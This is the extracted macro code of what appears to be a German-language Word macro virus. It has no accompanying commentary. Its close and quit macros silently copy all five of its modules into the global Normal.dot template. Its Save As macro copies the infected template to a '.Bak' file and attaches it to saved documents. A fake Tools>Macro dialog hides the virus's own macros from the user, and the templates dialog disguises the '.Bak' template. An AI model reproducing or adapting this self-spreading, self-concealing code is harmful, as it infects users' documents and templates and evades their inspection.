   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DATEISpeichernUnter"

   Public Sub MAIN()
   Dim Name_$
   Dim NormaldotName$
   Dim TarnName$
   On Error Resume Next
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   On Error GoTo -1: On Error GoTo ende
   WordBasic.Dialog.FileSaveAs dlg
   WordBasic.FileSaveAs dlg

   On Error Resume Next
   Name_$ = WordBasic.[FileName$]()
   NormaldotName$ = WordBasic.[MacroFileName$]()
   If WordBasic.[Left$](Name_$, 1) <> WordBasic.[Left$](NormaldotName$, 1) Then
    TarnName$ = WordBasic.[Left$](Name_$, Len(Name_$) - 3) + "Bak"
    WordBasic.CopyFile NormaldotName$, TarnName$
    WordBasic.FileTemplates Template:=TarnName$
    WordBasic.FileSaveAll 1
   End If
   ende:
   End Sub


   Attribute VB_Name = "DATEIDokVorlagen"

   Public Sub MAIN()
   Dim pos
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
   WordBasic.CurValues.FileTemplates dlg
   pos = InStr(dlg.Template, "Bak") + InStr(dlg.Template, "BAK")
   If pos > 0 Then dlg.Template = "Normal"
   On Error GoTo -1: On Error GoTo ende
   WordBasic.Dialog.FileTemplates dlg
   WordBasic.FileTemplates dlg
   ende:
   End Sub

   Attribute VB_Name = "DATEISchließen"

   Public Sub MAIN()
   Dim pos
   Dim m$
   On Error Resume Next

   pos = InStr(WordBasic.[MacroFileName$](), "Normal.dot")
   If pos = 0 Then
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    m$ = WordBasic.[FileName$]() + ":DATEISchließen"
    WordBasic.MacroCopy m$, "Global:DATEISchließen", 1
    m$ = WordBasic.[FileName$]() + ":EXTRASMakro"
    WordBasic.MacroCopy m$, "Global:EXTRASMakro", 1
    m$ = WordBasic.[FileName$]() + ":DATEIDokVorlagen"
    WordBasic.MacroCopy m$, "Global:DATEIDokVorlagen", 1
    m$ = WordBasic.[FileName$]() + ":DATEISpeichernUnter"
    WordBasic.MacroCopy m$, "Global:DATEISpeichernUnter", 1
    m$ = WordBasic.[FileName$]() + ":DATEIBeenden"
    WordBasic.MacroCopy m$, "Global:DATEIBeenden", 1
   End If

   WordBasic.FileClose

   End Sub

   Attribute VB_Name = "DATEIBeenden"

   Public Sub MAIN()
   Dim pos
   Dim m$
   On Error Resume Next

   pos = InStr(WordBasic.[MacroFileName$](), "Normal.dot")
   If pos = 0 Then
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    m$ = WordBasic.[FileName$]() + ":DATEISchließen"
    WordBasic.MacroCopy m$, "Global:DATEISchließen", 1
    m$ = WordBasic.[FileName$]() + ":EXTRASMakro"
    WordBasic.MacroCopy m$, "Global:EXTRASMakro", 1
    m$ = WordBasic.[FileName$]() + ":DATEIDokVorlagen"
    WordBasic.MacroCopy m$, "Global:DATEIDokVorlagen", 1
    m$ = WordBasic.[FileName$]() + ":DATEISpeichernUnter"
    WordBasic.MacroCopy m$, "Global:DATEISpeichernUnter", 1
    m$ = WordBasic.[FileName$]() + ":DATEIBeenden"
    WordBasic.MacroCopy m$, "Global:DATEIBeenden", 1
   End If

   WordBasic.FileQuit
   End Sub

   Attribute VB_Name = "EXTRASMakro"

   Dim Kombinationsfeld1__$()
   Dim Listenfeld1__$()
   Dim Listenfeld2__$()
   Dim Droplistenfeld1__$()
   Dim Name_$

   Public Sub MAIN()
   ReDim Kombinationsfeld1__$(WordBasic.CountMacros(0))
   ReDim Listenfeld1__$(10)
   ReDim Listenfeld2__$(10)
   ReDim Droplistenfeld1__$(3)
   Dim Z
   Dim i
   Dim Mn$
   Dim ii
   Dim kleinst$
   Dim nummer
   Dim x
   Name_$ = ""
   Rem *********** Makros in KombinationsdFeld1$()   sortiert !! *******
   ReDim feld2__$(WordBasic.CountMacros(0))
   Z = 0
   For i = 1 To WordBasic.CountMacros(0)
    Mn$ = WordBasic.[MacroName$](i, 0)
    Select Case Mn$
     Case "DATEIDokVorlagen"
      Rem Nix
     Case "EXTRASMakro"
      Rem Nix
     Case "DATEISpeichernUnter"
      Rem Nix
     Case "DATEISchließen"
      Rem Nix
     Case "DATEIBeenden"
      Rem Nix
     Case Else
     Z = Z + 1
     feld2__$(Z - 1) = WordBasic.[MacroName$](i, 0)
    End Select
   Next i
   For ii = 1 To Z
   kleinst$ = "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
    For i = 1 To Z
     If feld2__$(i - 1) < kleinst$ Then
      kleinst$ = feld2__$(i - 1)
      nummer = i - 1
     End If
    Next i
    Kombinationsfeld1__$(ii - 1) = kleinst$
    feld2__$(nummer) = "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
   Next ii

   Droplistenfeld1__$(0) = "Allen aktiven Dokumentvorlagen"
   Droplistenfeld1__$(1) = "Normal.dot (Globale Dokumentvorlage)"
   Droplistenfeld1__$(2) = "Word-Befehlen"

   WordBasic.BeginDialog 530, 290, "Makro", "EXTRASMakro.DialogNr1"
       WordBasic.ComboBox 9, 23, 250, 160, Kombinationsfeld1__$(), "Makrowahl$"
       WordBasic.DropListBox 8, 198, 510, 60, Droplistenfeld1__$(), "AktiveVorlage"
       WordBasic.ListBox 8, 237, 510, 37, Listenfeld1__$(), "Description"
       WordBasic.Text 10, 182, 93, 13, "&Makros aus:", "Text2"
       WordBasic.Text 8, 222, 104, 13, "Beschreibung", "Text3"
       WordBasic.Text 9, 7, 88, 13, "Makro&name", "Text1"
       WordBasic.PushButton 280, 7, 240, 21, "Aufze&ichnen...", "aufzeichnen"
       WordBasic.CancelButton 280, 33, 240, 21
       WordBasic.PushButton 280, 60, 240, 21, "&Ausführen", "Run"
       WordBasic.PushButton 280, 87, 240, 21, "&Erstellen", "erstellen"
       WordBasic.PushButton 280, 114, 240, 21, "&Löschen", "Delete"
       WordBasic.PushButton 280, 142, 240, 21, "&Organisieren", "organisieren"
       WordBasic.PushButton 280, 167, 240, 21, "&Hilfe", "Hilfe"
   WordBasic.EndDialog
   Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
   x = WordBasic.Dialog.UserDialog(dlg, 1)
   WordBasic.DisableInput 1
   Select Case x
    Case 1
     WordBasic.Beep
    Case 2
     WordBasic.ToolsMacro Name:=Name_$, Run:=1
    Case 3
     WordBasic.ToolsMacro Name:=Name_$, Edit:=1
    Case 4
     WordBasic.ToolsMacro Name:=Name_$, Delete:=1
    Case 5
    WordBasic.Beep
    Case 6
    WordBasic.HelpActiveWindow
   Case Else
   End Select
   End Sub

   Private Function DialogNr1(Bezeichner$, aktion, zustand)
   Dim weiteranzeigen
   Dim Mb$
   Dim i
   Dim pos
   Dim t
   On Error Resume Next
   weiteranzeigen = 0
   Select Case aktion
     Case 1
      WordBasic.DlgEnable "Ausführen", 0
      WordBasic.DlgEnable "erstellen", 0
      WordBasic.DlgEnable "Löschen", 0
      WordBasic.DlgEnable "Text3", 0
      WordBasic.DlgEnable "Beschreibung", 0
      WordBasic.DlgEnable "organisieren", 0
     Case 2
      weiteranzeigen = 0
      If Bezeichner$ = "Makrowahl$" Then
         WordBasic.DlgEnable "Text3", 1
         WordBasic.DlgEnable "Beschreibung", 1
         WordBasic.DlgEnable "Ausführen", 1
         WordBasic.DlgEnable "erstellen", 1
         WordBasic.DlgEnable "Löschen", 1
         WordBasic.[DlgText$] "erstellen", "B&earbeiten"
         Name_$ = Kombinationsfeld1__$(zustand)
         Mb$ = WordBasic.[MacroDesc$](Name_$)
         Rem ************************** Beschreibung in Listenfeld schreiben
         For i = 1 To 100
          Listenfeld2__$(i) = ""
         Next i
         i = 0
         pos = 1
         For t = 1 To Len(Mb$)
          If Asc(Mid(Mb$, t, 1)) = 10 Then
           Mb$ = WordBasic.[Left$](Mb$, t - 1) + WordBasic.[Right$](Mb$, Len(Mb$) - t) + " "
          End If
          If Asc(Mid(Mb$, t, 1)) = 13 Then
           Listenfeld2__$(i) = Mid(Mb$, pos, t - pos)
           i = i + 1
           pos = t + 1
          End If
         Next t
         If i = 0 Then Listenfeld2__$(i) = Mb$
         WordBasic.DlgListBoxArray "Beschreibung", Listenfeld2__$()
      End If
     Case 3
     weiteranzeigen = 1
    Case Else
    End Select
   DialogNr1 = weiteranzeigen
   End Function
